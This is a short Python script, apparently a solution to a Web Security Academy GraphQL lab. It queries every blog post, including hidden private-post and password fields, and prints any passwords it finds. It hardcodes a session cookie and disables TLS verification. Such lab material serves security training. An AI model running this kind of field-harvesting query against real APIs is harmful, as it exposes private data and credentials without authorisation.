#!/usr/bin/env python3
import requests
import json
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TARGET = "https://0ac3001d04afd00580ed3ac3009f0027.web-security-academy.net/graphql/v1"
SESSION = "khKFJGWyI0CouGOCVwrwqO8OzVPDuun4"

headers = {
    "Cookie": f"session={SESSION}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
}

# Query for all fields including sensitive ones
exploit_query = {
    "query": """
    query getAllData {
        getAllBlogPosts {
            id
            image
            title
            author
            date
            summary
            paragraphs
            isPrivate
            postPassword
        }
    }
    """,
    "operationName": "getAllData"
}

print("[*] Querying for all blog post data including sensitive fields...")
response = requests.post(TARGET, headers=headers, json=exploit_query, verify=False)

if response.status_code == 200:
    data = response.json()
    posts = data.get('data', {}).get('getAllBlogPosts', [])

    print(f"[+] Found {len(posts)} blog posts\n")

    for post in posts:
        print("="*60)
        print(f"ID: {post.get('id')}")
        print(f"Title: {post.get('title')}")
        print(f"Author: {post.get('author')}")
        print(f"Private: {post.get('isPrivate')}")
        print(f"Password: {post.get('postPassword')}")
        print(f"Paragraphs: {post.get('paragraphs')}")
        print("="*60)
        print()

        # Look for sensitive info in passwords
        if post.get('postPassword'):
            print(f"ðŸ”‘ FOUND PASSWORD: {post.get('postPassword')}")

else:
    print(f"[-] Request failed: {response.status_code}")
    print(f"Response: {response.text}")
